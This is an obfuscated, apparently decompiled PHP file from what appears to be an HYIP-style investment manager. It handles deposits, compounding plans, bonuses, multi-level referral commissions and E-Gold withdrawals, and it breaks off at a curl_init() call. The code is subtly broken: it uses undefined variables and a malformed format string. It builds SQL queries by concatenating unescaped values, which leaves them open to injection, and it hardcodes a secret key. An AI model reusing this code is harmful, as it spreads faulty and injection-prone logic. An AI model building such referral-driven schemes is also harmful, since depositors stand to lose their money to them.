<?
/*****************************************************/
/*                                                    */
/*  Este archivo fue creado por RedControl            */
/*                                                    */
/*                                                    */
/*    Version:      2010                              */
/*    Author:       www.redcontrol.com.ar             */
/*    Release on:   2010.01.18                        */
/*                                                    */
/******************************************************/


  function elnlceayf ($elnlczrvd)
  {
    $elnlcUfak = array ();
    if (preg_match ('/\\[default\\](.*?)\\[\\/default\\]/', $elnlczrvd, $elnlcUfak))
    {
      $elnlczrvd = $elnlcUfak[1];
    }

    return $elnlczrvd;
  }

  function elnlcapfc ($elnlczrvd, $elnlcqhoG, $d)
  {
    global $elnlcEuoJk;
    $elnlcNiWo = ($elnlczrvd + 48273) % $elnlcqhoG;
    $elnlczVmq = $elnlcEuoJk['elnlcTMAG'];
    $elnlceMBw = $elnlcNiWo;
    while ($elnlczVmq == 0)
    {
      if ($d[$elnlcNiWo] != -1)
      {
        ++$elnlcNiWo;
        if ($elnlcNiWo == $elnlcqhoG)
        {
          $elnlcNiWo = $elnlcEuoJk['elnlcTMAG'];
          continue;
        }

        continue;
      }

      $elnlczVmq = $elnlcEuoJk['elnlcRMbnT'];
    }

    return $elnlcNiWo;
  }

  function elnlcaftul ($elnlczrvd, $elnlcqhoG, $d)
  {
    global $elnlcEuoJk;
    $elnlcNiWo = ($elnlczrvd + 48273) % $elnlcqhoG;
    $elnlczVmq = $elnlcEuoJk['elnlcTMAG'];
    while (!$elnlczVmq)
    {
      if ($d[$elnlcNiWo] == -1)
      {
        ++$elnlcNiWo;
        if ($elnlcNiWo == $elnlcqhoG)
        {
          $elnlcNiWo = $elnlcEuoJk['elnlcTMAG'];
          continue;
        }

        continue;
      }

      $elnlczVmq = $elnlcEuoJk['elnlcRMbnT'];
    }

    return $elnlcNiWo;
  }

  function elnlcavnja ()
  {
    global $elnlcEuoJk;
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $elnlcVFudq;
    global $elnlcJutIa;
    $q = 'select * from hm2_users where id = 1';
    ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
    $elnlcrolf = array ();
    while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
    {
      $elnlcrolf = array ();
      $z = elnlcaplfw ($elnlcTnMjL[$elnlcEuoJk['elnlcfnsPF']], '&hd,mnf(fska$d3jlkfsda' . $elnlcJutIa[$elnlcEuoJk['elnlcstTp']]);
      $elnlcrolf = unserialize ($z);
    }

    return $elnlcrolf;
  }

  function elnlchlhp ()
  {
    global $elnlcEuoJk;
    if (!defined ('THE_GC_SCRIPT_V2005_04_01'))
    {
      print 'Please use only original script';
      exit ();
    }

    global $elnlcVFudq;
    global $elnlcHetjk;
    global $elnlcJutIa;
    $z = elnlcmzdkr (elnlckkgc (serialize ($elnlcHetjk), '&hd,mnf(fska$d3jlkfsda' . $elnlcJutIa[$elnlcEuoJk['elnlcstTp']]));
    $q = '' . 'update hm2_users set ac = \'' . $z . '\' where id = 1';
    (mysql_query ($q) OR print mysql_error ());
  }

  function elnlczcvs ($elnlcDmtV, $elnlcAhlbr, $elnlcdPCw, $elnlczpKW, $elnlcDslPO, $elnlcOgqJi, $elnlcOyTw)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    global $elnlcSxjJT;
    $elnlcOyTw = intval ($elnlcOyTw);
    $elnlcOgqJi = intval ($elnlcOgqJi);
    $elnlcAhlbr = intval ($elnlcAhlbr);
    $elnlcdPCw = sprintf ('%.02f', $elnlcdPCw);
    $elnlcGVhq = elnlcmzdkr ($elnlczpKW);
    $elnlckgOF = $elnlcEuoJk['elnlcTMAG'];
    $q = '' . 'select count(id) as cnt from hm2_history where ec = ' . $elnlcDmtV . ' && type = \'add_funds\' && description like \'%Batch id = ' . $elnlcGVhq . '\'';
    $elnlcbaLW = mysql_query ($q);
    $elnlcTnMjL = mysql_fetch_array ($elnlcbaLW);
    if (0 < $elnlcTnMjL[$elnlcEuoJk['elnlcrOxym']])
    {
      $elnlckgOF = $elnlcEuoJk['elnlcRMbnT'];
    }

    if ($elnlckgOF == 1)
    {
      return 0;
    }

    $elnlcobdcQ = 'Add funds to account from ' . $elnlcSxjJT[$elnlcDmtV][$elnlcEuoJk['elnlctegj']] . ('' . '. Batch id = ' . $elnlczpKW);
    if (($elnlcDmtV == 4 AND $elnlcJutIa[$elnlcEuoJk['elnlcgzvh']] == 1))
    {
      $elnlcobdcQ = 'Add funds to account from ' . $elnlcSxjJT[$elnlcDmtV][$elnlcEuoJk['elnlctegj']] . ('' . ' ' . $elnlcdPCw . ' - StormPay Fee. Batch id = ' . $elnlczpKW);
      $elnlcdPCw = $elnlcdPCw - $elnlcdPCw * 6.90000000000000035527137 / 100 - 0.689999999999999946709295;
    }
    else
    {
      if (($elnlcDmtV == 4 AND $elnlcJutIa[$elnlcEuoJk['elnlcrcfF']] == 1))
      {
        $elnlcobdcQ = 'Add funds to account from ' . $elnlcSxjJT[$elnlcDmtV][$elnlcEuoJk['elnlctegj']] . ('' . ' ' . $elnlcdPCw . ' - StormPay Fee. Batch id = ' . $elnlczpKW);
        $elnlcdPCw = $elnlcdPCw - $elnlcdPCw * 2.89999999999999991118216 / 100 - 0.390000000000000013322676;
      }
    }

    if (0 < $elnlcJutIa[$elnlcEuoJk['elnlccyAw']])
    {
      $elnlcTDCn = sprintf ('%0.2', $elnlcdPCw * $elnlcJutIa[$elnlcEuoJk['elnlccyAw']] / 100);
      if ($elnlcTDCn < $elnlcJutIa[$elnlcEuoJk['elnlcbCKSF']])
      {
        $elnlcTDCn = $elnlcJutIa[$elnlcEuoJk['elnlcbCKSF']];
      }

      $elnlcdPCw = $elnlcdPCw - $elnlcTDCn;
      $elnlcobdcQ .= '' . '. Deposit fee - ' . $elnlcTDCn;
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcziJV'])
    {
      $elnlcDmtV = $elnlcEuoJk['elnlctSDHf'];
    }

    $q = '' . 'insert into hm2_history set 
        	user_id = ' . $elnlcAhlbr . ',
        	amount = \'' . $elnlcdPCw . '\',
        	type = \'add_funds\',
        	description = \'' . $elnlcobdcQ . '\',
        	actual_amount = ' . $elnlcdPCw . ',
        	ec = ' . $elnlcDmtV . ',
        	date = now()    
        	';
    (mysql_query ($q) OR print mysql_error ());
    $q = '' . 'select * from hm2_types where id = ' . $elnlcOgqJi;
    ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
    $elnlcauee = '';
    $elnlcowrM = mysql_fetch_array ($elnlcbaLW);
    $elnlctuWo = -1;
    if ($elnlcowrM)
    {
      $elnlctuWo += $elnlcTnMjL[$elnlcEuoJk['elnlceDTDA']];
      $elnlcauee = elnlcmzdkr ($elnlcowrM[$elnlcEuoJk['elnlctegj']]);
      if ($elnlcowrM[$elnlcEuoJk['elnlcgRBBC']] == 0)
      {
        $elnlcOyTw = $elnlcEuoJk['elnlcTMAG'];
      }
      else
      {
        if ($elnlcowrM[$elnlcEuoJk['elnlcuafl']] == 0)
        {
          $elnlcowrM[$elnlcEuoJk['elnlcuafl']] = $elnlcdPCw + 1;
        }

        if (($elnlcowrM[$elnlcEuoJk['elnlcaWrN']] <= $elnlcdPCw AND $elnlcdPCw <= $elnlcowrM[$elnlcEuoJk['elnlcuafl']]))
        {
          if ($elnlcowrM[$elnlcEuoJk['elnlcVJgiM']] == 1)
          {
            $elnlcSJCUR = preg_split ('/\\s*,\\s*/', $elnlcowrM[$elnlcEuoJk['elnlcVAqsQ']]);
            if (!in_array ($elnlcOyTw, $elnlcSJCUR))
            {
              $elnlcOyTw = $elnlcSJCUR[0];
            }
          }
          else
          {
            if ($elnlcOyTw < $elnlcowrM[$elnlcEuoJk['elnlcJoei']])
            {
              $elnlcOyTw = $elnlcowrM[$elnlcEuoJk['elnlcJoei']];
            }

            if ($elnlcowrM[$elnlcEuoJk['elnlcvbav']] < $elnlcOyTw)
            {
              $elnlcOyTw = $elnlcowrM[$elnlcEuoJk['elnlcvbav']];
            }
          }
        }
        else
        {
          $elnlcOyTw = $elnlcEuoJk['elnlcTMAG'];
        }
      }
    }

    if ($elnlctuWo < 0)
    {
      $elnlctuWo = $elnlcEuoJk['elnlcTMAG'];
    }

    $q = '' . 'select min(hm2_plans.min_deposit) as min, max(if(hm2_plans.max_deposit = 0, 999999999999, hm2_plans.max_deposit)) as max from hm2_types left outer join hm2_plans on hm2_types.id = hm2_plans.parent where hm2_types.id = ' . $elnlcOgqJi;
    $elnlcpHCU = mysql_query ($q);
    $elnlcVOMs = mysql_fetch_array ($elnlcpHCU);
    $elnlcenIUw = $elnlcVOMs[$elnlcEuoJk['elnlcIPgC']];
    $elnlcdHSq = $elnlcVOMs[$elnlcEuoJk['elnlctPpS']];
    if (($elnlcenIUw <= $elnlcdPCw AND $elnlcdPCw <= $elnlcdHSq))
    {
      $q = '' . 'insert into hm2_deposits set
          	user_id = ' . $elnlcAhlbr . ',
          	type_id = ' . $elnlcOgqJi . ',
          	deposit_date = now(),
          	last_pay_date = now()+ interval ' . $elnlctuWo . ' day,
          	status = \'on\',
          	q_pays = 0,
          	amount = \'' . $elnlcdPCw . '\',
          	actual_amount = \'' . $elnlcdPCw . '\',
          	ec = ' . $elnlcDmtV . ',
          	compound = ' . $elnlcOyTw . '
          	';
      (mysql_query ($q) OR print mysql_error ());
      $elnlcEmcUR = mysql_insert_id ();
      $q = '' . 'insert into hm2_history set 
          	user_id = ' . $elnlcAhlbr . ',
          	amount = \'-' . $elnlcdPCw . '\',
          	type = \'deposit\',
          	description = \'Deposit to ' . elnlcmzdkr ($elnlcauee) . ('' . '\',
          	actual_amount = -' . $elnlcdPCw . ',
          	ec = ' . $elnlcDmtV . ',
          	date = now(),
                deposit_id = ' . $elnlcEmcUR . '
          	');
      (mysql_query ($q) OR print mysql_error ());
      if ($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcazft'])
      {
        $q = '' . 'update hm2_users set reset = 0 where id = ' . $elnlcubetc[$elnlcEuoJk['elnlciwGl']];
        mysql_query ($q);
      }

      if ($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcviOgh'])
      {
        $q = '' . 'select count(id) as col from hm2_deposits where user_id = ' . $elnlcAhlbr;
        ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
        $elnlcvDskB = $elnlcEuoJk['elnlcTMAG'];
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlcvDskB = $elnlcTnMjL[$elnlcEuoJk['elnlcbiVt']];
        }

        $q = 'select count(distinct user_id) as col from hm2_deposits';
        ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
        $elnlcSPjGr = $elnlcEuoJk['elnlculqdc'];
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlcSPjGr = $elnlcTnMjL[$elnlcEuoJk['elnlcbiVt']];
        }

        if (($elnlcvDskB == 1 AND $elnlcSPjGr <= 500))
        {
          $q = '' . 'insert into hm2_history set
  	user_id = ' . $elnlcAhlbr . ',
  	amount = 2,
  	type = \'bonus\',
  	description = \'Bonus\',
  	actual_amount = 2,
  	ec = ' . $elnlcDmtV . ',
  	date = now()';
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($elnlcJutIa[$elnlcEuoJk['elnlcSjLJJ']] == 1)
      {
        $elnlcKjyu = $elnlcEuoJk['elnlcTMAG'];
        if (0 < $elnlcJutIa[$elnlcEuoJk['elnlcqVdNJ']])
        {
          $elnlcKjyu = $elnlcdPCw * 1000 / $elnlcJutIa[$elnlcEuoJk['elnlcqVdNJ']];
        }

        if (0 < $elnlcKjyu)
        {
          $q = '' . 'update hm2_users set imps = imps + ' . $elnlcKjyu . ' where id = ' . $elnlcAhlbr;
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $elnlcHeAO = elnlcefba ($elnlcAhlbr, $elnlcdPCw, $elnlcDmtV);
    }
    else
    {
      $elnlcauee = 'Deposit to Account';
    }

    $q = '' . 'select * from hm2_users where id = ' . $elnlcAhlbr;
    $elnlcbaLW = mysql_query ($q);
    $elnlcEoaEi = mysql_fetch_array ($elnlcbaLW);
    $elnlcfqOum = array ($elnlcEoaEi);
    $elnlcfqOum[$elnlcEuoJk['elnlcxDSIx']] = $elnlcEoaEi[$elnlcEuoJk['elnlcxDSIx']];
    $elnlcfqOum[$elnlcEuoJk['elnlctegj']] = $elnlcEoaEi[$elnlcEuoJk['elnlctegj']];
    $elnlcfqOum[$elnlcEuoJk['elnlcMOxFJ']] = number_format ($elnlcdPCw, 2);
    $elnlcfqOum[$elnlcEuoJk['elnlcjnGN']] = $elnlcDslPO;
    $elnlcfqOum[$elnlcEuoJk['elnlcWkrr']] = $elnlcSxjJT[$elnlcDmtV][$elnlcEuoJk['elnlctegj']];
    $elnlcfqOum[$elnlcEuoJk['elnlcGPoCs']] = $elnlczpKW;
    $elnlcfqOum[$elnlcEuoJk['elnlcIINzb']] = $elnlcOyTw;
    $elnlcfqOum[$elnlcEuoJk['elnlcArPqi']] = elnlceayf ($elnlcauee);
    $elnlcfqOum[$elnlcEuoJk['elnlcxczgW']] = $elnlcHeAO;
    $elnlcfqOum[$elnlcEuoJk['elnlcqhlS']] = '[no upline]';
    if (0 < $elnlcEoaEi[$elnlcEuoJk['elnlcJzIQ']])
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcEoaEi[$elnlcEuoJk['elnlcJzIQ']];
      ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
      while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
      {
        $elnlcfqOum[$elnlcEuoJk['elnlcqhlS']] = $elnlcTnMjL[$elnlcEuoJk['elnlcxDSIx']];
      }
    }

    $q = 'select email from hm2_users where id = 1';
    $elnlcbaLW = mysql_query ($q);
    $elnlctVmWJ = '';
    while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
    {
      $elnlctVmWJ = $elnlcTnMjL[$elnlcEuoJk['elnlcaDcW']];
    }

    elnlcgjtfr ('deposit_admin_notification', $elnlctVmWJ, $elnlcJutIa[$elnlcEuoJk['elnlcznBTd']], $elnlcfqOum);
    elnlcgjtfr ('deposit_user_notification', $elnlcEoaEi[email], $elnlcJutIa[$elnlcEuoJk['elnlcznBTd']], $elnlcfqOum);
    return 1;
  }

  function elnlcefba ($elnlcAhlbr, $elnlcdPCw, $elnlcDmtV)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    global $elnlcSxjJT;
    $q = '' . 'select * from hm2_users where id = ' . $elnlcAhlbr;
    $elnlcPknMS = mysql_query ($q);
    $elnlcHhBnU = mysql_fetch_array ($elnlcPknMS);
    if ($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcziJV'])
    {
      $elnlcGlFEV = $elnlcNtrWW[$elnlcEuoJk['elnlcJzIQ']];
      $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcGlFEV;
      $elnlcbaLW = mysql_query ($q);
      $elnlcTnMjL = mysql_fetch_array ($elnlcbaLW);
      if ($elnlcTnMjL[$elnlcEuoJk['elnlcrOxym']] <= 0)
      {
        return 0;
      }

      $q = '' . 'select sum(actual_amount) as amnt from hm2_deposits as d, hm2_users as u where d.user_id = u.id and d.status = \'on\' and u.ref = ' . $elnlcGlFEV;
      $elnlcbaLW = mysql_query ($q);
      $elnlcTnMjL = mysql_fetch_array ($elnlcbaLW);
      if ($elnlcTnMjL[$elnlcEuoJk['elnlchMMmI']] < 3000)
      {
        $elnlcGGxPb = $elnlcEuoJk['elnlcTMAG'];
        return 0;
      }
      else
      {
        if ($elnlcTnMjL[$elnlcEuoJk['elnlchMMmI']] < 6000)
        {
          $elnlcGGxPb = 0.0200000000000000004163336;
        }
        else
        {
          if ($elnlcTnMjL[$elnlcEuoJk['elnlchMMmI']] < 12000)
          {
            $elnlcGGxPb = 0.0500000000000000027755576;
          }
          else
          {
            $elnlcGGxPb = 0.100000000000000005551115;
          }
        }
      }

      $elnlcocQS = $elnlcdPCw * $elnlcGGxPb;
      $q = '' . 'insert into hm2_history set
      	user_id = ' . $elnlcGlFEV . ',
      	amount = ' . $elnlcocQS . ',
      	actual_amount = ' . $elnlcocQS . ',
      	type = \'commissions\',
      	description = \'Referral commission from ' . elnlcmzdkr ($elnlcHhBnU[$elnlcEuoJk['elnlcxDSIx']]) . ('' . '\',
      	ec = ' . $elnlcDmtV . ',
      	date = now()');
      (mysql_query ($q) OR print mysql_error ());
      $q = '' . 'select * from hm2_users where id = ' . $elnlcGlFEV;
      $elnlcPknMS = mysql_query ($q);
      $elnlcGjLR = mysql_fetch_array ($elnlcPknMS);
      $elnlcGjLR[$elnlcEuoJk['elnlcMOxFJ']] = number_format ($elnlcocQS, 2);
      $elnlcGjLR[$elnlcEuoJk['elnlcjNpMa']] = $elnlcHhBnU[$elnlcEuoJk['elnlcxDSIx']];
      $elnlcGjLR[$elnlcEuoJk['elnlcRefSg']] = $elnlcHhBnU[$elnlcEuoJk['elnlctegj']];
      $elnlcGjLR[$elnlcEuoJk['elnlcWkrr']] = $elnlcSxjJT[$elnlcDmtV][$elnlcEuoJk['elnlctegj']];
      elnlcgjtfr ('referral_commision_notification', $elnlcGjLR[$elnlcEuoJk['elnlcaDcW']], $elnlcJutIa[$elnlcEuoJk['elnlcznBTd']], $elnlcGjLR);
    }

    $elnlcHeAO = $elnlcEuoJk['elnlcTMAG'];
    if ($elnlcJutIa[$elnlcEuoJk['elnlcJluTS']] == 1)
    {
      $elnlcGlFEV = $elnlcEuoJk['elnlcTMAG'];
      if (0 < $elnlcHhBnU[$elnlcEuoJk['elnlcJzIQ']])
      {
        $elnlcGlFEV = $elnlcHhBnU[$elnlcEuoJk['elnlcJzIQ']];
      }
      else
      {
        return 0;
      }

      if ($elnlcJutIa[$elnlcEuoJk['elnlcqzxc']])
      {
        $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcGlFEV;
        $elnlcbaLW = mysql_query ($q);
        $elnlcTnMjL = mysql_fetch_array ($elnlcbaLW);
        if ($elnlcTnMjL[$elnlcEuoJk['elnlcrOxym']] <= 0)
        {
          return 0;
        }
      }

      if ((0 < $elnlcJutIa[$elnlcEuoJk['elnlcFFLyb']] AND $elnlcdPCw < $elnlcJutIa[$elnlcEuoJk['elnlcFFLyb']]))
      {
        return 0;
      }

      if ($elnlcJutIa[$elnlcEuoJk['elnlcnJrj']] == 1)
      {
        if (0 < $elnlcJutIa[$elnlcEuoJk['elnlcCetHx']])
        {
          $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcAhlbr;
          $elnlcbaLW = mysql_query ($q);
          $elnlcTnMjL = mysql_fetch_array ($elnlcbaLW);
          if ($elnlcTnMjL[$elnlcEuoJk['elnlcrOxym']] == 1)
          {
            $elnlcocQS = $elnlcJutIa[$elnlcEuoJk['elnlcCetHx']];
            $elnlcHeAO += $elnlcocQS;
            $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcGlFEV . ',
    		amount = ' . $elnlcocQS . ',
    		actual_amount = ' . $elnlcocQS . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcmzdkr ($elnlcHhBnU[$elnlcEuoJk['elnlcxDSIx']]) . ('' . '\',
    		ec = ' . $elnlcDmtV . ',
    		date = now()');
            (mysql_query ($q) OR print mysql_error ());
            $q = '' . 'select * from hm2_users where id = ' . $elnlcGlFEV;
            $elnlcPknMS = mysql_query ($q);
            $elnlcGjLR = mysql_fetch_array ($elnlcPknMS);
            $elnlcGjLR[$elnlcEuoJk['elnlcMOxFJ']] = number_format ($elnlcocQS, 2);
            $elnlcGjLR[$elnlcEuoJk['elnlcjNpMa']] = $elnlcHhBnU[$elnlcEuoJk['elnlcxDSIx']];
            $elnlcGjLR[$elnlcEuoJk['elnlcRefSg']] = $elnlcHhBnU[$elnlcEuoJk['elnlctegj']];
            $elnlcGjLR[$elnlcEuoJk['elnlcWkrr']] = $elnlcSxjJT[$elnlcDmtV][$elnlcEuoJk['elnlctegj']];
            elnlcgjtfr ('referral_commision_notification', $elnlcGjLR[$elnlcEuoJk['elnlcaDcW']], $elnlcJutIa[$elnlcEuoJk['elnlcznBTd']], $elnlcGjLR);
          }
        }
      }
      else
      {
        if ($elnlcJutIa[$elnlcEuoJk['elnlcxRyf']] == 1)
        {
          $q = '' . 'select count(distinct user_id) as col from hm2_users, hm2_deposits where ref = ' . $elnlcGlFEV . ' and hm2_deposits.user_id = hm2_users.id';
        }
        else
        {
          $q = '' . 'select count(id) as col from hm2_users where ref = ' . $elnlcGlFEV;
        }

        $elnlcbaLW = mysql_query ($q);
        if ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlcQHMn = $elnlcTnMjL[$elnlcEuoJk['elnlcbiVt']];
          $q = '' . 'select * from hm2_users where id = ' . $elnlcGlFEV;
          $elnlcPknMS = mysql_query ($q);
          $elnlcnLNB = mysql_fetch_array ($elnlcPknMS);
          $elnlceojO = @unserialize ($elnlcnLNB[$elnlcEuoJk['elnlcjqTlq']]);
          if (isset ($elnlceojO[$elnlcEuoJk['elnlcusGx']]))
          {
            $j = $elnlcEuoJk['elnlcRMbnT'];
            while (isset ($elnlceojO['ref_percent' . $j]))
            {
              if (($elnlceojO['ref_percent' . $j][0] <= $elnlcQHMn AND $elnlcQHMn <= $elnlceojO['ref_percent' . $j][1]))
              {
                $elnlcocQS = $elnlcdPCw * $elnlceojO['ref_percent' . $j][2] / 100;
                $elnlcHeAO += $elnlcocQS;
                break;
              }

              ++$j;
            }
          }
          else
          {
            if ($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcmoQEQ'])
            {
              $q = '' . 'select sum(amount) as amnt from hm2_deposits where user_id = ' . $elnlcGlFEV;
              $elnlcbaLW = mysql_query ($q);
              $elnlcTnMjL = mysql_fetch_array ($elnlcbaLW);
              $elnlcGGxPb = $elnlcEuoJk['elnlcTMAG'];
              if (10000 <= $elnlcTnMjL[$elnlcEuoJk['elnlchMMmI']])
              {
                $elnlcGGxPb = $elnlcEuoJk['elnlcrDSfN'];
              }
              else
              {
                if (5000 <= $elnlcTnMjL[$elnlcEuoJk['elnlchMMmI']])
                {
                  $elnlcGGxPb = $elnlcEuoJk['elnlcOfGcu'];
                }
                else
                {
                  if (3000 <= $elnlcTnMjL[$elnlcEuoJk['elnlchMMmI']])
                  {
                    $elnlcGGxPb = $elnlcEuoJk['elnlccCJm'];
                  }
                  else
                  {
                    if (1000 <= $elnlcTnMjL[$elnlcEuoJk['elnlchMMmI']])
                    {
                      $elnlcGGxPb = $elnlcEuoJk['elnlcmATS'];
                    }
                  }
                }
              }

              if (0 < $elnlcGGxPb)
              {
                if (4 <= $elnlcQHMn)
                {
                  $elnlcGGxPb += 3;
                }

                $elnlcocQS = $elnlcdPCw * $elnlcGGxPb / 100;
                $elnlcHeAO += $elnlcocQS;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcGlFEV . ',
    		amount = ' . $elnlcocQS . ',
    		actual_amount = ' . $elnlcocQS . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcmzdkr ($elnlcHhBnU[$elnlcEuoJk['elnlcxDSIx']]) . ('' . '\',
    		ec = ' . $elnlcDmtV . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
            else
            {
              $q = '' . 'select percent from hm2_referal where from_value <= ' . $elnlcQHMn . ' and (to_value >= ' . $elnlcQHMn . ' or to_value = 0) order by from_value desc limit 1';
              ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
              if ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
              {
                $elnlcocQS = $elnlcdPCw * $elnlcTnMjL[$elnlcEuoJk['elnlcicuKE']] / 100;
                $elnlcHeAO += $elnlcocQS;
                $q = '' . 'insert into hm2_history set
    		user_id = ' . $elnlcGlFEV . ',
    		amount = ' . $elnlcocQS . ',
    		actual_amount = ' . $elnlcocQS . ',
    		type = \'commissions\',
    		description = \'Referral commission from ' . elnlcmzdkr ($elnlcHhBnU[$elnlcEuoJk['elnlcxDSIx']]) . ('' . '\',
    		ec = ' . $elnlcDmtV . ',
     		date = now()');
                (mysql_query ($q) OR print mysql_error ());
              }
            }
          }

          $q = '' . 'select * from hm2_users where id = ' . $elnlcGlFEV;
          $elnlcPknMS = mysql_query ($q);
          $elnlcGjLR = mysql_fetch_array ($elnlcPknMS);
          $elnlcGjLR[$elnlcEuoJk['elnlcMOxFJ']] = number_format ($elnlcocQS, 2);
          $elnlcGjLR[$elnlcEuoJk['elnlcjNpMa']] = $elnlcHhBnU[$elnlcEuoJk['elnlcxDSIx']];
          $elnlcGjLR[$elnlcEuoJk['elnlcRefSg']] = $elnlcHhBnU[$elnlcEuoJk['elnlctegj']];
          $elnlcGjLR[$elnlcEuoJk['elnlcWkrr']] = $elnlcSxjJT[$elnlcDmtV][$elnlcEuoJk['elnlctegj']];
          elnlcgjtfr ('referral_commision_notification', $elnlcGjLR[$elnlcEuoJk['elnlcaDcW']], $elnlcJutIa[$elnlcEuoJk['elnlcznBTd']], $elnlcGjLR);
        }
      }

      if ($elnlcJutIa[$elnlcEuoJk['elnlcnJrj']] != 1)
      {
        for ($i = $elnlcEuoJk['elnlcGmHP']; $i < 11; ++$i)
        {
          if (($elnlcGlFEV == 0 OR $elnlcJutIa['ref' . $i . '_cms'] == 0))
          {
            break;
          }

          if ((0 < $elnlcJutIa['ref' . $i . '_cms_minamount'] AND $elnlcdPCw < $elnlcJutIa['ref' . $i . '_cms_minamount']))
          {
            continue;
          }

          $q = '' . 'select * from hm2_users where id = ' . $elnlcGlFEV;
          $elnlcbaLW = mysql_query ($q);
          $elnlcGlFEV = $elnlcEuoJk['elnlcTMAG'];
          while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
          {
            $elnlcGlFEV = $elnlcTnMjL[$elnlcEuoJk['elnlcJzIQ']];
            if (0 < $elnlcGlFEV)
            {
              $elnlciLuw = $elnlcEuoJk['elnlcRMbnT'];
              if ($elnlcJutIa[$elnlcEuoJk['elnlcqzxc']] == 1)
              {
                $elnlciLuw = $elnlcEuoJk['elnlcTMAG'];
                $q = '' . 'select count(id) as cnt from hm2_deposits where user_id = ' . $elnlcGlFEV;
                $elnlceIrts = mysql_query ($q);
                $elnlceMCu = mysql_fetch_array ($elnlceIrts);
                if (0 < $elnlceMCu[$elnlcEuoJk['elnlcrOxym']])
                {
                  $elnlciLuw = $elnlcEuoJk['elnlcRMbnT'];
                }
              }

              if ($elnlciLuw == 1)
              {
                $elnlcocQS = $elnlcdPCw * $elnlcJutIa['ref' . $i . '_cms'] / 100;
                $elnlcHeAO += $elnlcocQS;
                $q = 'insert into hm2_history set
                  user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcJzIQ']] . ('' . ',
                  amount = ' . $elnlcocQS . ',
                  actual_amount = ' . $elnlcocQS . ',
                  type = \'commissions\',
                  description = \'Referral commission from ') . elnlcmzdkr ($elnlcHhBnU[$elnlcEuoJk['elnlcxDSIx']]) . ('' . ' ' . $i . ' level referral\',
                  ec = ' . $elnlcDmtV . ',
                  date = now()');
                (mysql_query ($q) OR print mysql_error ());
                continue;
              }

              continue;
            }
          }
        }
      }
    }

    return $elnlcHeAO;
  }

  function elnlcgushn ($elnlcDslPO, $elnlcDmtV)
  {
    global $elnlcEuoJk;
    global $elnlcSxjJT;
    $elnlcDmtV = intval ($elnlcDmtV);
    $elnlcDslPO = elnlcmzdkr ($elnlcDslPO);
    $q = '' . 'select count(*) as cnt from hm2_pay_settings where n=\'ext_accounts_blacklist\' and v=\'' . $elnlcDmtV . '=' . $elnlcDslPO . '\'';
    $elnlcbaLW = mysql_query ($q);
    $elnlcTnMjL = mysql_fetch_assoc ($elnlcbaLW);
    if (0 < $elnlcTnMjL[$elnlcEuoJk['elnlcrOxym']])
    {
      return array (0, 'Blacklisted ' . $elnlcSxjJT[$elnlcDmtV] . ' account ' . $elnlcDslPO);
    }

    return array (1, '');
  }

  function elnlckofpc ($elnlcOhRB, $elnlcdPCw, $elnlcDslPO, $elnlcCQAl, $elnlcgPrNl)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    if ($elnlcJutIa[$elnlcEuoJk['elnlcNUQQL']] == $elnlcEuoJk['elnlcMdla'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcJutIa[$elnlcEuoJk['elnlcctILW']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcDslPO == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to E-Gold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid E-Gold account', '');
    }

    list ($elnlckNTHO, $elnlcnzOA) = elnlcgushn ($elnlcDslPO, 0);
    if ($elnlckNTHO == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcnzOA . '\'';
      mysql_query ($q);
      return array (0, $elnlcnzOA);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcOhRB == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'egold_account_password\'';
        $elnlcbaLW = mysql_query ($q);
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          $elnlctRwF = elnlcefsf ($elnlcTnMjL[$elnlcEuoJk['elnlcBVfc']], $elnlcEuoJk['elnlcdmCFO']);
        }
      }
      else
      {
        $elnlctRwF = $elnlcOhRB;
      }

      $elnlcJkNgH = curl_init ();
